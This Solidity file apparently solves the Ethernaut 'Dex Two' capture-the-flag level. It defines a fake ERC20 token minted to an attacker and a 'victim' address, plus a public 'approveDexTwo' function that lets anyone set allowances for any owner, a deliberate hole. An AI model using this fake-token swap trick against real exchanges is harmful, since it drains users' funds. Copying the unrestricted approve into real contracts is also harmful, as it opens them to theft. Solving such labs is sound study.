// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract FakeToken is ERC20 {
  constructor(string memory name, string memory symbol, address victimAdress) public ERC20(name, symbol) {
        _mint(msg.sender, 200);
        _mint(victimAdress, 1);
  }

  function approveDexTwo(address owner, address spender, uint256 amount) public returns(bool){
    super._approve(owner, spender, amount);
  }
}